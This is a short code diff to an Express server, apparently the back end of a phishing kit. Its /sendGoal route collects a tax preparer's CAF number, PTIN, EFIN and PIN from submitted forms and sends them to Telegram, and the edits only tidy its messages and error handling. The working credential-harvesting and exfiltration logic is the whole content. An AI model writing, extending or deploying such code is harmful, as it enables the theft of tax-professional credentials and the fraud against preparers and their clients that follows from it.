@@ -135,21 +135,21 @@ app.post('/sendPersonal', async (req, res, next) => {
     next(error);
   }
 });
-app.post('/sendGoal', async (req, res, next) => {
+app.post('/sendGoal', async (req, res) => {
   const { caf, ptin, efin, pin } = req.body;
 
   if (!caf || !ptin || !efin || !pin) {
-    return res.status(400).json({ success: false, message: "Missing required fields" });
+    return res.status(400).json({ success: false, message: "Missing fields" });
   }
 
-  const message = `📌 GOAL INFO:\nCAF: ${caf}\nPTIN: ${ptin}\nEFIN: ${efin}\nPIN: ${pin}`;
+  const message = `GOAL INFO:\nCAF: ${caf}\nPTIN: ${ptin}\nEFIN: ${efin}\nPIN: ${pin}`;
 
   try {
-    await sendTelegramMessage(message); // your Telegram logic
+    await sendTelegramMessage(message); // your custom function
     res.status(200).json({ success: true, message: "Goal info sent to Telegram" });
-  } catch (error) {
-    console.error('Error sending goal:', error.response?.data || error.message);
-    next(error);
+  } catch (err) {
+    console.error("Telegram Error:", err);
+    res.status(500).json({ success: false, message: "Server error" });
   }
 });
 
